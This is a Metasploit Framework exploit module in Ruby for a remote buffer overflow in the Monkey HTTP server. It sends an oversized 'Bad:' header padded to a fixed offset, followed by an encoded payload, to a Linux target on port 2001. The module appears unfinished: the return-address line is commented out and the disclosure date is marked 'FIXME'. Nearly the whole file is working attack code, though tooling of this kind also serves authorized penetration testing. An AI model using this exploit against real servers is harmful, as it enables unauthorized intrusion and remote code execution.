##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Monkey HTTPD Null Byte Request',
			'Description'    => %q{
				An error in header parsing leads to a buffer overflow.
				This affects all versions.
			},
			'Author'         =>
				[
					'Doug Prostko <dougtko[at]gmail[dot]com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL' => 'http://monkey-project.com'],
				],
			'Payload'        =>
				{
					'Space'    => 512,
					#'BadChars' => "",
					'EncoderType' => Msf::Encoder::Type::AlphanumMixed,

				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
					['Ubuntu',
						{
							'Ret' => 0x0804d784, # p/p/r in monkey
							'Offset' => 2511
						}
					],
				],
			'DisclosureDate' => 'FIXME: May 25, 2013'))

		register_options(
			[
				Opt::RPORT(2001),
			], self.class)
	end

	# mk_request.c:268 is where the crash is
	def exploit
		buf = "GET / HTTP/1.1\r\n"
		buf << "Host:" + "\r\n"
		buf << "localhost\r\n"
		buf << "Bad: "
		buf << rand_text_alphanumeric(target['Offset'])
		buf << "B"*4
		#buf << [ target['Ret'] ].pack('V')
		buf << payload.encoded
		buf << "\r\n\r\n\r\n"

		connect
		sock.put(buf)
		disconnect
	end
end
